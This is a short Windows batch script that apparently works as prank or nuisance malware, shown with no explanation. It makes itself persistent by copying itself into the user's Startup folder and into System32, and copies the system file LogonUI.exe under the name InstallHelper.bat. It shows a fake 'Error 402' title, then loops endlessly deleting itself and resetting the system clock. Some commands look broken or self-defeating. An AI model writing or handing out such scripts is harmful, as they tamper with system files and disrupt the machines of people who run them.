@echo off
copy %0 %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
cd C:\Windows\System32
copy %0 C:\Windows\System32
xcopy LogonUI.exe InstallHelper.bat
chcp 65001
title Ошибка 402 Error 402
:winCrash
copy %0
del %0
time 3:00
time 12:00
goto winCrash
